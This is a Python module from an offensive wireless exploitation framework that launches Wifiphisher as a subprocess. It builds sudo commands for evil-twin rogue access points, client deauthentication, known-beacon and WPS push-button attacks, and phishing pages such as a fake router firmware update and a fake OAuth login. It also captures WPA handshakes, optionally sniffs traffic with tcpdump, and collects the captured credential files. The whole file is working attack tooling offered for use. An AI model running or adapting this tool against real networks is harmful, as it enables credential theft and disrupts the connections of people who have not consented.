#!/usr/bin/env python3
# Author: André Henrique (@mrhenrike) | União Geek — https://github.com/Uniao-Geek
"""Bridge subprocess for Wifiphisher (GPL-3.0) — evil twin / phishing Wi-Fi framework.

Wifiphisher is invoked as an external process; no GPL code is linked or imported.
The bridge validates prerequisites, builds the command line, launches wifiphisher
with the chosen scenario/extensions, and collects captured credentials from its
output directory.

Supported attack modes (mapped to wifiphisher extensions):
  - deauth              Deauthenticate clients from target AP
  - knownbeacons        Broadcast known SSIDs to trigger auto-connect
  - lure10              Exploit Windows Wi-Fi Sense / Location Service
  - wpspbc              WPS Push-Button Connect exploitation
  - evil_twin           Rogue AP + phishing page (default workflow)

Supported phishing scenarios (built-in wifiphisher templates):
  - firmware-upgrade    Router firmware update page asking for PSK
  - oauth-login         Social network OAuth login (Facebook popup)
  - plugin_update       Browser plugin update (payload delivery)
  - wifi_connect        Network Manager imitation (PSK capture)

Improvements from upstream wifiphisher:
  - PR #1673: modernized launcher/layout compatibility (entrypoint detection)
  - PR #1560: optional inline packet sniffer during campaigns

Version: 1.1.0
"""

from __future__ import annotations

import json
import logging
import os
import shutil
import subprocess
import time
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple

from wirelessxpl.core.exploit import *

logger = logging.getLogger(__name__)


class Exploit(Exploit):
    """Wifiphisher subprocess bridge for WirelessXPL-Forge.

    Launches wifiphisher as a controlled subprocess with configurable
    scenario, extensions, target AP, and interface options.
    """

    __info__ = {
        "name": "Wifiphisher Bridge",
        "description": (
            "Evil twin + credential phishing via Wifiphisher (GPL-3.0 subprocess). "
            "Supports deauth, known-beacons, lure10, WPS-PBC, and 4 built-in "
            "phishing scenarios (firmware-upgrade, oauth-login, plugin_update, wifi_connect). "
            "Custom scenarios from WXF phishing_pages/ are also supported."
        ),
        "authors": [
            "André Henrique (@mrhenrike) | União Geek",
            "wifiphisher contributors (GPL-3.0, invoked as subprocess)",
        ],
        "references": [
            "https://github.com/wifiphisher/wifiphisher",
            "https://wifiphisher.org",
        ],
        "devices": ("wifi",),
    }

    target = OptString("", "Target AP ESSID (or leave blank for interactive selection)")
    target_bssid = OptString("", "Target AP BSSID (MAC address)")
    scenario = OptString(
        "firmware-upgrade",
        "Phishing scenario: firmware-upgrade | oauth-login | plugin_update | wifi_connect | <custom_path>",
    )
    extensions = OptString(
        "deauth",
        "Comma-separated extensions: deauth, knownbeacons, lure10, wpspbc",
    )
    interface = OptString("", "Wi-Fi interface for rogue AP (auto-detect if blank)")
    deauth_interface = OptString("", "Wi-Fi interface for deauth (auto-detect if blank)")
    channel = OptString("", "Channel for rogue AP (auto if blank)")
    handshake_capture = OptBool(True, "Also capture WPA handshake during deauth")
    credentials_dir = OptString("", "Directory to save captured credentials (default: .log/)")
    sniffer_enabled = OptBool(False, "Enable inline packet sniffer (tcpdump) while wifiphisher runs")
    sniffer_interface = OptString("", "Interface for sniffer (default: deauth_interface or interface)")
    sniffer_bpf = OptString("", "Optional tcpdump BPF filter")
    sniffer_output = OptString("", "PCAP output path (default: .log/wifiphisher_capture_<ts>.pcap)")
    dry_run = OptBool(False, "Print command without executing")

    KNOWN_SCENARIOS = ("firmware-upgrade", "oauth-login", "plugin_update", "wifi_connect")
    KNOWN_EXTENSIONS = ("deauth", "knownbeacons", "lure10", "wpspbc")

    def _find_wifiphisher(self) -> Optional[Tuple[str, bool]]:
        """Locate wifiphisher entrypoint and whether python wrapper is needed."""
        binary = shutil.which("wifiphisher")
        if binary:
            return binary, False

        root = Path(__file__).resolve().parents[5]
        candidates = (
            root / "submodules" / "IoT" / "wifiphisher" / "bin" / "wifiphisher",  # legacy
            root / "submodules" / "IoT" / "wifiphisher" / "wifiphisher.py",  # flat script
            root / "submodules" / "IoT" / "wifiphisher" / "wifiphisher" / "__main__.py",  # package entry
        )
        for entry in candidates:
            if entry.exists():
                if entry.suffix == ".py":
                    return str(entry), True
                return str(entry), False

        return None

    def _build_command(self) -> List[str]:
        """Build the wifiphisher command line from current options."""
        found = self._find_wifiphisher()
        wfp = found[0] if found else ""
        needs_python = found[1] if found else False
        if not wfp:
            raise FileNotFoundError(
                "wifiphisher not found. Install it or ensure submodules/IoT/wifiphisher is cloned."
            )

        cmd = ["sudo", "python3", wfp] if needs_python else ["sudo", wfp]

        if self.target:
            cmd.extend(["-e", self.target])
        if self.target_bssid:
            cmd.extend(["--target-ap-bssid", self.target_bssid])
        if self.scenario:
            if self.scenario in self.KNOWN_SCENARIOS:
                cmd.extend(["-p", self.scenario])
            elif Path(self.scenario).is_dir():
                cmd.extend(["--phishing-pages-directory", self.scenario])
            else:
                cmd.extend(["-p", self.scenario])

        ext_list = [e.strip() for e in self.extensions.split(",") if e.strip()]
        for ext in ext_list:
            if ext not in self.KNOWN_EXTENSIONS:
                logger.warning("Unknown extension '%s'; passing anyway", ext)
        if ext_list:
            cmd.extend(["--extensions", ",".join(ext_list)])

        if self.interface:
            cmd.extend(["-aI", self.interface])
        if self.deauth_interface:
            cmd.extend(["-jI", self.deauth_interface])
        if self.channel:
            cmd.extend(["--channel", self.channel])
        if self.handshake_capture:
            cmd.append("--handshake-capture")

        return cmd

    def _build_sniffer_command(self, log_dir: Path) -> Optional[List[str]]:
        """Build optional tcpdump sniffer command for live capture."""
        if not self.sniffer_enabled:
            return None

        tcpdump_bin = shutil.which("tcpdump")
        if not tcpdump_bin:
            logger.warning("sniffer_enabled=True but tcpdump not found in PATH")
            return None

        capture_iface = (
            str(self.sniffer_interface).strip()
            or str(self.deauth_interface).strip()
            or str(self.interface).strip()
        )
        if not capture_iface:
            logger.warning("sniffer_enabled=True but no capture interface was provided")
            return None

        output_path = str(self.sniffer_output).strip()
        if not output_path:
            output_path = str(log_dir / "wifiphisher_capture_{}.pcap".format(int(time.time())))

        cmd = ["sudo", tcpdump_bin, "-i", capture_iface, "-U", "-n", "-w", output_path]
        bpf = str(self.sniffer_bpf).strip()
        if bpf:
            cmd.extend(bpf.split())
        return cmd


    def check(self) -> str:
        """Verify external tool dependencies are installed."""
        import shutil
        tools: list[str] = []
        src = getattr(self.__class__, "__doc__", "") or ""
        for t in ("aircrack-ng", "airodump-ng", "aireplay-ng", "airmon-ng",
                   "hashcat", "hcxdumptool", "hcxtools", "wifite", "bettercap",
                   "kismet", "hostapd", "dnsmasq", "mdk4", "mdk3",
                   "hostapd-wpe", "hostapd-mana", "eaphammer"):
            if t.replace("-ng", "").replace("-", "") in (src + self.__class__.__name__).lower():
                tools.append(t)
        if not tools:
            tools = ["aircrack-ng"]
        missing = [t for t in tools if not shutil.which(t.rstrip("_"))]
        if missing:
            return f"Missing tools: {', '.join(missing)} - install before use"
        return f"Tool dependencies found: {', '.join(tools)} - prerequisites OK"

    def run(self) -> None:
        """Execute wifiphisher as subprocess."""
        try:
            cmd = self._build_command()
        except FileNotFoundError as err:
            print_error(str(err))
            return

        cmd_str = " ".join(cmd)

        if self.dry_run:
            print_info("DRY RUN — would execute:")
            print_status(cmd_str)
            return

        print_status("Launching wifiphisher...")
        print_info("Command: {}".format(cmd_str))
        print_info("Scenario: {}".format(self.scenario))
        print_info("Extensions: {}".format(self.extensions))
        print_info("Press Ctrl+C to stop wifiphisher.")

        log_dir = Path(self.credentials_dir) if self.credentials_dir else Path(".log")
        log_dir.mkdir(parents=True, exist_ok=True)
        sniffer_cmd = self._build_sniffer_command(log_dir)
        sniffer_proc = None
        if sniffer_cmd:
            print_info("Inline sniffer enabled: {}".format(" ".join(sniffer_cmd)))

        try:
            if sniffer_cmd:
                sniffer_proc = subprocess.Popen(
                    sniffer_cmd,
                    cwd=str(log_dir),
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                )
            result = subprocess.run(
                cmd,
                cwd=str(log_dir),
                timeout=None,
                check=False,
            )
            if result.returncode == 0:
                print_success("Wifiphisher completed successfully.")
            else:
                print_error("Wifiphisher exited with code {}".format(result.returncode))
        except KeyboardInterrupt:
            print_info("\nWifiphisher interrupted by user.")
        except Exception as err:
            print_error("Failed to run wifiphisher: {}".format(err))
        finally:
            if sniffer_proc and sniffer_proc.poll() is None:
                sniffer_proc.terminate()
                try:
                    sniffer_proc.wait(timeout=2)
                except Exception:
                    sniffer_proc.kill()

        self._collect_credentials(log_dir)

    def _collect_credentials(self, log_dir: Path) -> None:
        """Look for credential files left by wifiphisher."""
        cred_files = list(log_dir.glob("*credentials*")) + list(log_dir.glob("*creds*"))
        if cred_files:
            print_success("Captured credentials found:")
            for f in cred_files:
                print_info("  {}".format(f))
        else:
            print_info("No credential files found in {}".format(log_dir))
